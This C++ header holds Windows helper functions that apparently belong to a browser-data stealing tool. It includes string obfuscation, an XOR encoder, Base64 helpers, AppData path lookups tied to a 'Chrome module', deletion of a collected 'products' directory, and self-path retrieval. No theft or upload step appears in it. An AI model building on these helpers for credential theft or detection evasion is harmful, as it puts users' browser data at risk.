#pragma once
#include <windows.h>
#include <filesystem>
#include <iostream>
#include <Shlobj.h>
#include "SystemInfo.h"
#include "obfuscate.h"
#include "Base64.h"
#include "HttpRequests.h"
#include "json.hpp"

namespace Tool
{
    namespace Utils
    {
        template <typename T>
        void print(const T& sPrintMessage) {
        #ifndef NDEBUG
            std::cout << "[+] " << sPrintMessage << std::endl;
        #endif
        }

        template <typename T>
        void print_error(const T& sErrorMessage) {
        #ifndef NDEBUG
            std::cout << "[-] Error: " << sErrorMessage << "   Code: " << GetLastError() << std::endl;
        #endif
        }

        static bool IsApplicationInstalled(std::string sPathName) {
            return std::filesystem::exists(sPathName);
        }

        static std::string XOR(char* sPlainText) {
            std::string sXored = "";
            int key = 81;
            for (char c = *sPlainText; c; c = *++sPlainText) {
                if (c == -1) break;
                sXored += (c ^ key) % 255;
            }
            return sXored;
        }

        static std::wstring GetCurrentUserDirectory()
        {
            WCHAR path[MAX_PATH];
            if (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path) != 0)
            {
                Tool::Utils::print_error(std::string(__FUNCTION__));
                return L"";
            }
            return path;
        }

        static std::string Base64decode(std::string sEncodedString) {
            std::string sDecodedString;
            encrypt::Base64::Decode(sEncodedString, sDecodedString);
            return sDecodedString;
        }

        static std::string Base64encode(std::string sDecodedString) {
            return encrypt::Base64::Encode(sDecodedString);
        }

        static void GetLocalAppDataPath(std::string& sAppDataPath) {
            WCHAR wAppDataLocalDir[MAX_PATH];
            if (!SHGetSpecialFolderPathW(NULL, wAppDataLocalDir, CSIDL_LOCAL_APPDATA, false)) {
                // Hard error, disalbe Chrome module
                Tool::Utils::print_error("Getting path to local AppData");
                return;
            }
            std::wstring wCurrentDir(wAppDataLocalDir);
            sAppDataPath = std::string(wCurrentDir.begin(), wCurrentDir.end());
        }

        static void GetRoamingAppDataPath(std::string& sAppDataPath) {
            WCHAR wAppDataRoaming[MAX_PATH];
            if (!SHGetSpecialFolderPathW(NULL, wAppDataRoaming, CSIDL_APPDATA, false)) {
                // Hard error, disalbe Chrome module
                Tool::Utils::print_error("Getting path to local AppData");
                return;
            }
            std::wstring wCurrentDir(wAppDataRoaming);
            sAppDataPath = std::string(wCurrentDir.begin(), wCurrentDir.end());
        }

        static void GetProgramFilesPath(std::string& sProgramFilesPath) {
            WCHAR ProgramFilesW[MAX_PATH];
            if (!SHGetSpecialFolderPathW(NULL, ProgramFilesW, CSIDL_LOCAL_APPDATA, false)) {
                // Hard error, disalbe Chrome module
                Tool::Utils::print_error("Getting path to local Program Files");
                return;
            }
            std::wstring wProgramFiles(ProgramFilesW);
            sProgramFilesPath = std::string(wProgramFiles.begin(), wProgramFiles.end());
        }

        static void CleanExtraFromJson(std::string& sBuffer) {
            sBuffer[sBuffer.length() - 1] = ' ';
        }

        static std::string UnquoteString(char* sValue) {
            std::string sValueTemp(sValue);
            if (sValueTemp.find('\"') != std::string::npos)
                std::replace(sValueTemp.begin(), sValueTemp.end(), '\"', '\'');
            return sValueTemp;
        }

        static std::wstring s2ws(std::string sSource) {
            std::wstring wTempString(sSource.begin(), sSource.end());
            return wTempString;
        }

        static void RemoveDirTree(std::string& sDirPath) {
            std::wstring wDirPath(sDirPath.begin(), sDirPath.end());
            std::error_code errorCode;
            std::filesystem::remove_all(std::filesystem::path(sDirPath), errorCode);
            (errorCode.value() != 32) ? print(STR("Removed products directory")) : Tool::Utils::print_error(STR("Unable to remove products directory"));
        }

        static void GetCurrentFileName(std::string& sToolPath) {
            TCHAR szFileName[MAX_PATH];
            GetModuleFileName(NULL, szFileName, MAX_PATH);
            std::wstring wToolPath(szFileName);
            std::string sToolPathTemp(wToolPath.begin(), wToolPath.end());
            sToolPath = sToolPathTemp;
        }

        static void hexStr(BYTE* data, int len, std::string& sDecoded)
        {
            std::stringstream ss;
            ss << std::hex;

            for (int i(0); i < len; ++i)
                ss << std::setw(2) << std::setfill('0') << (int)data[i];
            sDecoded = ss.str();
        }
    }
}
